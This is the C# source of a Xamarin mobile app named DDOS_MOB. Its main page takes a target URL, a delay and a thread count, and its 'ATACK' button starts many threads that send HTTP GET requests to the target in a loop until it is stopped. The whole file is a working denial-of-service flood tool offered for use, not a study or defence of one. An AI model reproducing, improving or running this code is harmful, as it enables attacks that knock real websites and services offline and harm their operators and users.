using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Xamarin.Forms;

namespace DDOS_MOB
{
    public partial class MainPage : ContentPage
    {
        int start = 0;
        string u = null;
        int t = 0;
        int h = 0;
        public MainPage()
        {
            InitializeComponent();
        }
        private void ddos()
        {
            
            if (!String.IsNullOrEmpty(url.Text))
            {
                u = url.Text;
            }
            else
            {
                DisplayAlert("URL ERROR", "URL", "OK");
            }
            if (!String.IsNullOrEmpty(timeout.Text))
            {
                t = Convert.ToInt32(timeout.Text);
            }
            else
            {
                DisplayAlert("TIMEOUT ERROR", "TIMEOUT", "OK");
            }           
            if (!String.IsNullOrEmpty(threads.Text))
            {
                h = Convert.ToInt32(threads.Text);
            }
            else
            {
                DisplayAlert("THREADS ERROR", "THREADS", "OK");
            }
            if (h == 1)
            {
                Thread tr = new Thread(thread);
                tr.Start();

            }
            else
            {
                for (int i = 0;i < h; i++)
                {
                    Thread tr = new Thread(thread);
                    tr.Start();
                }
            }
        }
        private void thread()
        {
            do
            {
                try
                {
                    HttpClient client = new HttpClient();
                    client.MaxResponseContentBufferSize = 2;                    
                    client.GetAsync(u);
                    Thread.Sleep(t);
                }
                catch
                {

                }
            } while (start == 1);
        }
        private void atack_Clicked(object sender, EventArgs e)
        {
            if (ATACK.Text == "ATACK")
            {
                start = 1;
                ATACK.TextColor = Color.Red;
                ATACK.Text = "STOP";               
            }
            else if (ATACK.Text == "STOP")
            {
                start = 0;
                ATACK.TextColor = Color.Green;
                ATACK.Text = "ATACK";               
            }
            ddos();
        }
    }
}
